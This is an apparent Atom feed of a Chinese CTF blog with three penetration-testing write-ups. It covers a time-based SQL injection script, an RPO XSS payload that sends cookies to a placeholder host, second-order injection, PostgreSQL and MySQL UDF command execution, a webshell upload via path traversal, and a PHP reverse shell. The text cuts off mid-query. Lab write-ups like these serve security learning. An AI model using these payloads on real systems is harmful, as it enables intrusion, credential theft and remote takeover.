<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HeartSky&#39;s blog</title>
  
  <subtitle>在渗透之路上渐行渐远</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://heartsky.info/"/>
  <updated>2018-04-01T12:40:08.000Z</updated>
  <id>http://heartsky.info/</id>
  
  <author>
    <name>HeartSky</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PwnHub 目瞪口呆 writeup</title>
    <link href="http://heartsky.info/2018/04/01/PwnHub-%E7%9B%AE%E7%9E%AA%E5%8F%A3%E5%91%86-writeup/"/>
    <id>http://heartsky.info/2018/04/01/PwnHub-目瞪口呆-writeup/</id>
    <published>2018-04-01T12:39:24.000Z</published>
    <updated>2018-04-01T12:40:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>整个题目代码非常少，有下面三个文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conn.php <span class="comment"># 建立数据库连接</span></span><br><span class="line">index.php <span class="comment"># 查询数据库显示所有文章</span></span><br><span class="line">article.php <span class="comment"># 根据id查询文章并把阅读数+1</span></span><br></pre></td></tr></table></figure></p><p>很容易可以看出注入是在 <code>article.php</code> 的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/(sleep|benchmark|outfile|dumpfile|load_file|join)/i"</span>, $_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"you bad bad!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"select * from article where id='"</span>.intval($id).<span class="string">"'"</span>;</span><br><span class="line">$res = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"404 not found!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($res, MYSQL_ASSOC);</span><br><span class="line">mysql_query(<span class="string">"update view set view_times=view_times+1 where id = '"</span>.$id.<span class="string">" '"</span>);</span><br></pre></td></tr></table></figure></p><p>可以看到这里两个 sql 语句对 id 的处理不同的，注入点也就是 update 的地方，因为只是单纯更新数据，没有任何回显，所以这里就要思考下在 update 前后发生了什么变化，因为在之后没有取值什么的操作了，我们无从知道是否更新数据成功，所以唯一可能变化的就是时间了</p><p>然后去网上找了下，找到一篇 wp 看起来和这个类似<br><a href="https://blog.csdn.net/niexinming/article/details/52980140" target="_blank" rel="external">https://blog.csdn.net/niexinming/article/details/52980140</a></p><p>文中提到了一种 heavy query 的攻击方式，通过对一张表作自身的笛卡尔积从而让查询时间变长从而达到我们想要产生的时间变化</p><p>本地测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from information_schema.columns;</span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">|     6554 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.21 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(*) from information_schema.columns, information_schema.columns T2;</span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">| 42954916 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (1.52 sec)</span><br></pre></td></tr></table></figure></p><p>不过比较麻烦的是容易把数据库打挂，应该很多选手用的这种方式，导致了前期正常请求也很慢，后期看到稍微有些正常了，就写了脚本跑了下，因为做一次笛卡尔积数据库要挂个几分钟，所以这里就直接比对每个字符，不用二分法了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = string.printable</span><br><span class="line">url = <span class="string">"http://10.211.55.6/pwnhub/mudengkoudai/article.php?id=2"</span></span><br><span class="line">url = <span class="string">'http://52.80.179.198:8080/article.php?id=2'</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url, timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        url2 = url + <span class="string">"' or id in (select if(((select ascii(substr(group_concat(table_name),"</span> + str(i) + <span class="string">",1)) from information_schema.tables where table_schema=database() and table_name!='article' and table_name!='view')='"</span> + str(ord(str(j))) + <span class="string">"'),(select count(*) from information_schema.columns, information_schema.columns T1, information_schema.columns T2, information_schema.columns T3),(233)))%23"</span></span><br><span class="line">        url2 = url + <span class="string">"' or id in (select if(((select ascii(substr(group_concat(column_name),"</span> + str(i) + <span class="string">",1)) from information_schema.columns where table_schema=database() and table_name='flags')='"</span> + str(ord(str(j))) + <span class="string">"'),(select count(*) from information_schema.columns, information_schema.columns T1, information_schema.columns T2, information_schema.columns T3),(233)))%23"</span></span><br><span class="line">        url2 = url + <span class="string">"' or id in (select if(((select ascii(substr(flag,"</span> + str(i) + <span class="string">",1)) from flags)='"</span> + str(ord(str(j))) + <span class="string">"'),(select count(*) from information_schema.columns, information_schema.columns T1, information_schema.columns T2, information_schema.columns T3),(233)))%23"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url2, timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            name += str(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> name</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> test():</span><br><span class="line">            time.sleep(<span class="number">200</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment"># flags flag pwnhub&#123;flag:a6fe3d9432024e97aa40bd867161561e&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;整个题目代码非常少，有下面三个文件&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://heartsky.info/tags/CTF/"/>
    
      <category term="writeup" scheme="http://heartsky.info/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>第二届强网杯 Web/Crypto writeup</title>
    <link href="http://heartsky.info/2018/03/27/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-Crypto-writeup/"/>
    <id>http://heartsky.info/2018/03/27/第二届强网杯-Web-Crypto-writeup/</id>
    <published>2018-03-27T08:17:03.000Z</published>
    <updated>2018-10-26T06:08:42.430Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h3><p>一共三关<br>前面两关是MD5函数不能处理数组以及0e弱类型比较的问题<br>第三关<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((string)$_GET[<span class="string">'param1'</span>]!==(string)$_GET[<span class="string">'param2'</span>] &amp;&amp; md5($_GET[<span class="string">'param1'</span>])===md5($_GET[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"success!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>找到两个MD5值一样的字符串<br><a href="https://www.mscs.dal.ca/~selinger/md5collision/" target="_blank" rel="external">https://www.mscs.dal.ca/~selinger/md5collision/</a></p><p>简单扩展下 md5 的哈希过程<br>这里我用 ppt 画了一个图方便理解<br><img src="http://heartsky.info/images/QWB/20180327000044_7pgkxf_Screenshot.jpeg" alt=""><br>明文进行 64 bit 的分组，不足则进行 padding，这里的 s0 和函数 f 都是固定的，第一次就是利用函数 f 把第一个分组 m0 和初始化向量 s0 作为输入，得到输出 s1，依次类推，最后得到的 s6，也就是哈希后的结果，即图中的 enc</p><p>最后一关就是 05 年王小云提出的 md5 哈希碰撞，也就是图中左上角的式子，对于两个不同的消息分组 M、N，s 相同，经过两次 f 函数后得到的结果是一样的，前面的消息分组对应图中的 m2，也就是虽然 m2、m3 不同，但是最后两次 f 函数后的 s4 是相同的，即最后哈希结果相同</p><h3 id="share-your-mind"><a href="#share-your-mind" class="headerlink" title="share your mind"></a>share your mind</h3><p>前端后端对解析差异的问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/969/..%2f..%2f..%2f..%2findex.php/add</span><br></pre></td></tr></table></figure></p><p>对于这个 url，nginx 和 apache 的解析是不同的，apache 是把 <code>..%2f..%2f..%2f..%2findex.php</code> 当做一层路径，而 nginx 会先进行 url 解码，即 <code>/index.php/view/article/969/../../../../index.php/add</code>，最后也就是 <code>/index.php/add</code></p><p>然后注意到 <code>/index.php/add</code> 是会在相对路径下引入 <code>../static/js/jquery.min.js</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;../static/js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>对于这个引入，前端实际引入的 url 路径是 <code>index.php/view/article/969/..%2f..%2f..%2f..%2findex.php/../static/js/jquery.min.js</code><br>前端浏览器不会进行路径的 url 解码，所以最后的路径是 <code>index.php/view/article/969/static/js/jquery.min.js</code></p><p>后端是正则匹配来解析，导致匹配到 <code>index.php/view/article/969</code> 时就返回了页面内容，也就是实际引入的是我们写入的文章</p><p>然后发布文章处就可以写入任意 js 了，为了避免后台过滤踩坑，直接用这种<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 108, 111, 99, 97, 116, 105, 111, 110, 61, 34, 104, 116, 116, 112, 58, 47, 47, 98, 97, 105, 100, 117, 46, 99, 111, 109, 34))</span><br></pre></td></tr></table></figure></p><p><code>eval</code> 替换为 <code>document.write</code> 也是可以的，注意里面不要加引号，不然就直接当成字符串原样输出了</p><p>打到 cookie 提示是在某个子页面的 cookie 里</p><p>这里就涉及到另一个知识点了<br>我们知道对于 url 来说，同源策略要求域名、协议、端口完全相同。而 cookie 也是有同源策略的，不同的是 cookie 的同源策略仅以域名、路径作为识别依据。所以不同路径下 cookie 是不一样的，因此问题就是如何获取子域的 cookie，这里采用了 iframe<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var i=document.createElement(&quot;iframe&quot;);</span><br><span class="line">i.src=&quot;/QWB_fl4g/QWB/&quot;;</span><br><span class="line">i.id=&quot;a&quot;;</span><br><span class="line">document.body.appendChild(i);</span><br><span class="line">i.onload = function ()&#123;</span><br><span class="line">  var c=document.getElementById(&apos;a&apos;).contentWindow.document.cookie;</span><br><span class="line">location.href=&quot;http://xxxxx?xx=&quot;+c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>用 iframe 引入了一个子页面，然后读取它的 cookie<br>最后 flag 就在 cookie 里</p><p><a href="http://blog.nsfocus.net/rpo-attack/" target="_blank" rel="external">RPO攻击技术浅析</a></p><h3 id="three-hint"><a href="#three-hint" class="headerlink" title="three hint"></a>three hint</h3><p>二次注入<br>注册后登录会查询和你年龄相同的用户名并输出出来<br>猜测大概是这么写的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$res = $conn-&gt;query(&quot;SELECT * FROM test2 WHERE user=&apos;$user&apos;&quot;);</span><br><span class="line">$age = $res-&gt;fetch_assoc()[&apos;age&apos;];</span><br><span class="line"></span><br><span class="line">$sql = &quot;SELECT * FROM test2 WHERE age=$age limit 1&quot;;</span><br><span class="line">$res = $conn-&gt;query($sql);</span><br><span class="line">$row = $res-&gt;fetch_assoc();</span><br><span class="line">echo &apos;Hi &apos;.$user.&apos;, your age is &apos;.$age.&apos; years old. The same age with you is &apos;.$row[&apos;user&apos;];</span><br></pre></td></tr></table></figure></p><p>在注册时对于年龄只验证是否为数字，用 16 进制就可以把原始数据存入数据库，比如这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into test2 values(1, 0x3120616e6420313d3020756e696f6e2073656c65637420342c2873656c65637420646174616261736528292923);</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test2;</span><br><span class="line">+------+-----------------------------------------------+</span><br><span class="line">| user | age                                           |</span><br><span class="line">+------+-----------------------------------------------+</span><br><span class="line">| 1    | 1 and 1=0 union select 4,(select database())# |</span><br><span class="line">+------+-----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><p>然后在根据年龄查询相同用户名的时候用的就是数据库里的”脏”数据，最终导致了 sql 注入</p><h3 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h3><p>正解是 Apache Shiro Java 反序列化漏洞，但是 payload 不能直接打，要做修改，参照 orange 的<a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html?m=1" target="_blank" rel="external">文章</a></p><p>我对 java 不是很熟悉，这里是用了另一个漏洞</p><p>扫描端口发现 postgresql 服务开放<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE    SERVICE</span><br><span class="line">22/tcp   open     ssh</span><br><span class="line">42/tcp   filtered nameserver</span><br><span class="line">135/tcp  filtered msrpc</span><br><span class="line">139/tcp  filtered netbios-ssn</span><br><span class="line">445/tcp  filtered microsoft-ds</span><br><span class="line">593/tcp  filtered http-rpc-epmap</span><br><span class="line">1027/tcp filtered IIS</span><br><span class="line">1028/tcp filtered unknown</span><br><span class="line">1068/tcp filtered instl_bootc</span><br><span class="line">3128/tcp filtered squid-http</span><br><span class="line">4444/tcp filtered krb524</span><br><span class="line">5432/tcp open     postgresql</span><br><span class="line">5800/tcp filtered vnc-http</span><br><span class="line">5900/tcp filtered vnc</span><br><span class="line">6669/tcp filtered irc</span><br><span class="line">8009/tcp open     ajp13</span><br><span class="line">8080/tcp open     http-proxy</span><br></pre></td></tr></table></figure></p><p>存在 postgresql 未授权访问漏洞，使用默认用户 postgres 密码为空可直接进入数据库</p><p>列目录有限制，只能是当前目录，这基本就是 udf 提权了</p><p>在当前目录发现了一些别人写进来的 .so 文件，那我们直接用就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE FUNCTION sys_eval()  RETURNS text AS  &apos;./udf.so&apos; LANGUAGE C STRICT;</span><br><span class="line">select sys_eval(&apos;ls /&apos;);</span><br></pre></td></tr></table></figure></p><p>关于 udf 提权，<a href="http://www.91ri.org/6507.html" target="_blank" rel="external">参考文章</a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>占坑</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;h3 id=&quot;web签到&quot;&gt;&lt;a href=&quot;#web签到&quot; class=&quot;headerlink&quot; title=&quot;web签到&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://heartsky.info/tags/CTF/"/>
    
      <category term="writeup" scheme="http://heartsky.info/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>Pockr 未授权访问引发的血案</title>
    <link href="http://heartsky.info/2018/03/26/Pockr-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/"/>
    <id>http://heartsky.info/2018/03/26/Pockr-未授权访问引发的血案/</id>
    <published>2018-03-26T15:51:02.000Z</published>
    <updated>2018-10-26T06:08:42.433Z</updated>
    
    <content type="html"><![CDATA[<p>靶场来源: <a href="https://pockr.org/bug-environment/detail?environment_no=env_a20a1282feaae3fcbc" target="_blank" rel="external">https://pockr.org/bug-environment/detail?environment_no=env_a20a1282feaae3fcbc</a></p><h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><p>打开网站后只有登录和找回密码的功能<br>其中找回密码处随意输入一个邮箱都会返回 <code>{&quot;message&quot;:&quot;false&quot;}</code>，这时注意到页面下方的技术支持邮箱，输入了下发现返回了一些重要信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;true&quot;,&quot;email&quot;:&quot;admin@pockr.com&quot;,&quot;userid&quot;:&quot;BB568A04-8159-964E-CE49-D68AC10F8101&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>此时我们已经得到了 userid 信息，暂时不知道什么用，翻下源码，注意到有一个 <code>sea-config.js</code>，包含了两个重要的 js 文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login.js</span><br><span class="line">api.js</span><br></pre></td></tr></table></figure></p><p>login.js 定义了找回密码时对邮箱的验证以及向后台发送请求，api.js 定义了一个在前端没有出现的功能，会向 <code>User_Pockr_Api/UserInfo</code> POST 一个 <code>userid=xxx</code> 的请求，这时联想到之前我们得到的 userid，直接构造一个请求，比较蛋疼的是 burp 的一个显示 bug，多 POST 了一行数据导致一直是格式错误，以为还有一层加密结果也没找到。最后就没做了，等过了几天发现有一个微信群，问了下出题人一块探讨了下才发现了这个意料之外的问题(表示心塞</p><p>输入正确的 userid 得到用户名<br><img src="http://heartsky.info/images/pockr_weishouqun/20180323233934_lxopKB_Screenshot.jpeg" alt=""></p><p>但是没有密码，尝试了下简单的弱口令不行，于是直接上了 top 1000 常用密码字典，得到密码为 <code>1q2w3e</code>，成功登录</p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>后台只有两个搜索功能和一个文件上传功能，测试了下搜索功能并没有用，再去试下文件上传功能</p><p>随便上传一个会得到这样的提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; php</span><br><span class="line">    [1] =&gt; </span><br><span class="line">    [2] =&gt; jpeg</span><br><span class="line">    [3] =&gt; gif</span><br><span class="line">    [4] =&gt; jpg</span><br><span class="line">    [5] =&gt; png</span><br><span class="line">)</span><br><span class="line">&lt;p&gt;The filetype you are attempting to upload is not allowed.&lt;/p&gt;</span><br></pre></td></tr></table></figure></p><p>应该是后缀的白名单，不过 php 在这里瞬间感觉有戏<br>直接上传了一个一句话，并且得到了路径<br><img src="http://heartsky.info/images/pockr_weishouqun/20180323234624_JkhDor_Screenshot.jpeg" alt=""><br>但是返回的路径只有子文件夹和文件名，加上我们的一层文件夹，试了半天没找到文件在哪个目录下。最后发现是存在目录穿越漏洞的，通过更改 <code>subSysFolder</code>，可以让它上传到网站根目录下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryYfProJjo3FeUv8V1</span><br><span class="line">Content-Disposition: form-data; name=&quot;subSysFolder&quot;</span><br><span class="line"></span><br><span class="line">../../../../../../../var/www/html/www</span><br></pre></td></tr></table></figure></p><p>web 根目录通过一个 php 报错发现<br><img src="http://heartsky.info/images/pockr_weishouqun/20180323235034_AP3HhY_Screenshot.jpeg" alt=""></p><h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><p>这里我电脑没下菜刀、蚁剑之类的工具，就直接反弹 shell 到我 vps 上了<br>用上 p 神的利用 php webshell 来反弹 shell 的脚本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = <span class="string">'xxx'</span>;</span><br><span class="line">$port = xxx;</span><br><span class="line">$sock = fsockopen($ip, $port);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; $sock,</span><br><span class="line">        <span class="number">1</span> =&gt; $sock,</span><br><span class="line">        <span class="number">2</span> =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(<span class="string">'/bin/sh'</span>, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);</span><br></pre></td></tr></table></figure></p><p>文章地址: <a href="https://www.leavesongs.com/PHP/backshell-via-php.html" target="_blank" rel="external">https://www.leavesongs.com/PHP/backshell-via-php.html</a></p><p>成功反弹<br><img src="http://heartsky.info/images/pockr_weishouqun/20180323235551_Ic2whg_Screenshot.jpeg" alt=""></p><p>因为目标是要获取数据库服务器权限，我们先去读取数据库配置文件。CI 的默认配置文件在 <code>application/config/database.php</code></p><p>得到 mysql 用户的用户名密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$db[&apos;default&apos;] = array(</span><br><span class="line">&apos;dsn&apos;=&gt; &apos;mysql:host=sql05.ciadmin.com;port=3306;dbname=five_admindb&apos;,</span><br><span class="line">&apos;username&apos; =&gt; &apos;ciadmin&apos;,</span><br><span class="line">&apos;password&apos; =&gt; &apos;mysql_2018&apos;,</span><br><span class="line">&apos;dbdriver&apos; =&gt; &apos;pdo&apos;,</span><br><span class="line">&apos;dbprefix&apos; =&gt; &apos;&apos;,</span><br><span class="line">&apos;pconnect&apos; =&gt; FALSE,</span><br><span class="line">&apos;db_debug&apos; =&gt; (ENVIRONMENT !== &apos;production&apos;),</span><br><span class="line">&apos;cache_on&apos; =&gt; FALSE,</span><br><span class="line">&apos;cachedir&apos; =&gt; &apos;&apos;,</span><br><span class="line">&apos;char_set&apos; =&gt; &apos;utf8&apos;,</span><br><span class="line">&apos;dbcollat&apos; =&gt; &apos;utf8_general_ci&apos;,</span><br><span class="line">&apos;swap_pre&apos; =&gt; &apos;&apos;,</span><br><span class="line">&apos;encrypt&apos; =&gt; FALSE,</span><br><span class="line">&apos;compress&apos; =&gt; FALSE,</span><br><span class="line">&apos;stricton&apos; =&gt; FALSE,</span><br><span class="line">&apos;failover&apos; =&gt; array(),</span><br><span class="line">&apos;save_queries&apos; =&gt; TRUE</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p>在尝试连接 mysql 时，发现没有 mysql 这个命令，这个时候大概猜到了网站和数据库不是同一台服务器，<code>cat /etc/hosts</code> 看下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.18.0.2bug05.ciadmin.com bug05</span><br></pre></td></tr></table></figure></p><p>不能直接用命令连接 mysql，但是我们可以在 php 中去连接，直接从根目录下 copy 了一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$mysql_server_name=&apos;sql05.ciadmin.com&apos;;</span><br><span class="line">$mysql_username=&apos;ciadmin&apos;;</span><br><span class="line">$mysql_password=&apos;mysql_2018&apos;;</span><br><span class="line">$mysql_database=&apos;five_admindb&apos;;</span><br><span class="line">$mysqli = mysqli_connect($mysql_server_name,$mysql_username,$mysql_password,$mysql_database);</span><br><span class="line">if (mysqli_connect_error()) &#123;</span><br><span class="line">die(&apos;Connect Database Error&apos;);</span><br><span class="line">&#125;</span><br><span class="line">$sql = $_GET[&apos;sql&apos;];</span><br><span class="line">$q = mysqli_query($mysqli,$sql);</span><br><span class="line">var_dump($q-&gt;fetch_array());</span><br><span class="line">mysqli_close($mysqli);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>成功执行 mysql 语句<br><img src="http://heartsky.info/images/pockr_weishouqun/20180324000700_pun5yJ_Screenshot.jpeg" alt=""></p><h3 id="mysql-udf-提权"><a href="#mysql-udf-提权" class="headerlink" title="mysql udf 提权"></a>mysql udf 提权</h3><p>谷歌了下，思路比较明确，通过 udf(user defined function)加载函数并执行命令<br>寻找插件库路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%plugin_dir%&quot;;</span><br></pre></td></tr></table></figure></p><p>是 Linux 下的默认目录 <code>/usr/lib/mysql/plugin/</code><br>因为已经有人写入 mysqludf.so 文件了，直接读取写入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 